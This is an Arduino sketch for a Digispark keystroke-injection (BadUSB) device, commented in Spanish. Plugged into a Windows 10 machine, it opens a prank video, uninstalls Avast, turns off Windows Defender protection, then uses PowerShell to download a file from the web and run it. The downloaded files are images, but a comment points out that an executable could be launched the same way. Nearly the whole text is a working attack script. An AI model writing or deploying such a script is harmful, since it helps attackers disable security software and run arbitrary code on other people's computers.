//ingresamos a una url de broma y desactivamos Windows Defender y mediante powershell descargamos un archivo y lo invocamos
//esto solo funciona con windows 10
//para ejecutarlo en diferentes teclados español-latino/inglés, se deben remplazar las lines de código comentadas

#include "DigiKeyboard.h"
void setup() {}
void loop(){
  //RickRoll ---> ON
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  //DigiKeyboard.print("https://youtu.be/dQw4w9WgXcQ");
  DigiKeyboard.print("https>&&youtu.be&dQw4w9WgXcQ");
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

   //Avast ---> OFF
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT); //minimizamos todas las ventanas para evitar errores en el manejo
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);//Menu de inicio de windows
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("Remove"); //buscamos la opcion para desintalar programas
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print("\t");//TAB N°1
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");//TAB N°2
  DigiKeyboard.delay(500);
  DigiKeyboard.println("Avast"); //buscamos la aplicación
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("\t");//TAB N°1
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");//TAB N°2
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");//TAB N°3
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("\t");//TAB N°1
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");//TAB N°2
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("\t");//TAB N°1
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");//TAB N°2
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10000);
  DigiKeyboard.print("\t");//TAB N°1
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");//TAB N°2
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");//TAB N°3
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");//TAB N°4
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");//TAB N°5
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");//TAB N°6
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");//TAB N°1
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(90000);
  DigiKeyboard.print("\t");//TAB N°1
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");//TAB N°2
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");//TAB N°3
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT); //cerramos la ventana

  //Windows Defender ---> OFF
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT); //minimizamos todas las ventanas para evitar errores en el manejo
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);//Menu de inicio de windows
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("Windows Security Settings"); //buscamos  windows defender
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print("\t");//TAB N°1
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");//TAB N°2
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");//TAB N°3
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");//TAB N°4
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");//TAB N°1
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");//TAB N°2
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT); //cerramos la ventana
  
  //Poweshell--->ON
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("Powershell");
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  //DigiKeyboard.print("(New-Object System.Net.WebClient).DownloadFile("https://media.wired.com/photos/59271004cefba457b079c01e/master/pass/white-gray-black-hat-hacker-158788611.jpg","$($Env:userprofile)/Desktop/white-gray-black-hat-hacker-158788611.jpg")");
  DigiKeyboard.print("*New/Object System.Net.WebClient(.DownloadFile*@https>&&vanschneider.com&blog&content&images&wp/content&uploads&2017&01&cake.jpg@,@$*$Env>userprofile(&Desktop&cake.jpg@(");
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  //DigiKeyboard.print("Invoke/item $Env>userprofile&Desktop&white/gray/black/hat/hacker/158788611.jpg");
  DigiKeyboard.print("Invoke/item $Env>userprofile&Desktop&cake.jpg");
  // ESTE COMANDO HARA QUE TU POWERSHELL EJECUTE ALGO EN .EXE
  //& "D:\juegos\The Second Circle Game Files\The_Second_Circle.exe"
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  for(;;);
  }
